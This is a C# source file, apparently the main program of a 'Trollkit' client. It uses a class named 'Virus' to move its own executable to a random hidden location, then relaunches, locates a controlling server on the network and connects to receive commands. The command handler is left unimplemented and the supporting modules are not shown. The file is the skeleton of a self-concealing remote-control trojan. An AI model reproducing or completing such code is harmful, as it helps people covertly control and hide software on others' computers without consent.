using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Trollkit_Client.Modules;
using Trollkit_Library;
using Trollkit_Library.Models;

namespace Trollkit_Client
{
	class Program
	{
		private ClientDiscovery discover;
		private ClientReceiver receiver;

		static void Main(string[] args)
		{
			
			if (args.Length > 0)
				if(args[0] == "move-completed")
				{
					Console.WriteLine("Application has been moved to a different location...");
					var program = new Program();
					var addresses = program.discover.GetIpAddresses();
					string ip = program.discover.GetRemoteServerIp(addresses);
					program.receiver.ConnectAndReceive(ip);
					Console.Read();
					return;
				}


			Virus virus = new Virus();
			string randomLocation = virus.FindRandomFileLocation();
			Console.WriteLine(AppDomain.CurrentDomain.BaseDirectory + System.AppDomain.CurrentDomain.FriendlyName);
			Console.WriteLine(randomLocation);
			virus.moveFileToLocation(randomLocation);

			Console.Read();
		}

		public Program()
		{
			discover = new ClientDiscovery("gang?", "Dopple gang");
			receiver = new ClientReceiver();
			receiver.OnDataReceived += Receiver_OnDataReceived;
		}

		private void Receiver_OnDataReceived(TransferCommandObject Object)
		{
			throw new NotImplementedException();
		}
	}
}
